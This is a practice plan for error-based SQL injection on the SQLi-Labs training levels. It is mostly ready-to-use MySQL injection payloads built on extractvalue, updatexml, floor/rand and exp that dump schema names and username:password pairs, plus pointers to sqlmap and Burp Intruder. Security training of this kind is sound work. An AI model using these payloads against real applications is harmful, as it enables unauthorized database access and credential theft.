# Double Query Injection Practice Plan

## Practice Objectives
1. Practice Less-5, 6 in SQLi-Labs (Double Query levels)
2. Test various error-based functions
3. Master data extraction techniques
4. Summarize best practices

## Practice Steps

### Step 1: extractvalue() Function Test
```sql
# Test basic syntax
?id=1' and extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--+

# Extract all databases
?id=1' and extractvalue(1,concat(0x7e,(SELECT group_concat(schema_name) FROM information_schema.schemata),0x7e))--+

# Extract table names
?id=1' and extractvalue(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema='security'),0x7e))--+

# Extract column names
?id=1' and extractvalue(1,concat(0x7e,(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='users'),0x7e))--+

# Extract data
?id=1' and extractvalue(1,concat(0x7e,(SELECT concat(username,':',password) FROM users LIMIT 0,1),0x7e))--+
```

### Step 2: updatexml() Function Test
```sql
# Similar to extractvalue()
?id=1' and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)--+

# Extract data（maximum length32characters）
?id=1' and updatexml(1,concat(0x7e,(SELECT group_concat(username,':',password) FROM users LIMIT 0,1),0x7e),1)--+
```

### Step 3: floor() + rand() + group by Test
```sql
# Basic syntax
?id=1' and (SELECT 1 FROM (SELECT count(*),concat((SELECT database()),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--+

# Extract table names
?id=1' and (SELECT 1 FROM (SELECT count(*),concat((SELECT table_name FROM information_schema.tables WHERE table_schema='security' LIMIT 0,1),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--+
```

### Step 4: exp() Function Test (MySQL 5.5+)
```sql
# Overflow error
?id=1' and exp(~(SELECT * FROM (SELECT database())a))--+

# Extract data
?id=1' and exp(~(SELECT * FROM (SELECT concat(username,':',password) FROM users LIMIT 0,1)a))--+
```

## Automated Test Scripts
- Use sqlmap's --technique=E parameter (Error-based)
- Write Python scripts for automated testing
- Use Burp Suite Intruder for batch testing

## Learning Resources
1. Less-5: Single quote Double Query
2. Less-6: Double quote Double Query
3. Less-13: POST + Double Query
4. Less-14: POST + double quote Double Query

## Expected Outcomes
- Understand error-based injection principles
- Master 4 commonly used error-based functions
- Be able to manually construct injection statements
- Be able to use automated tools
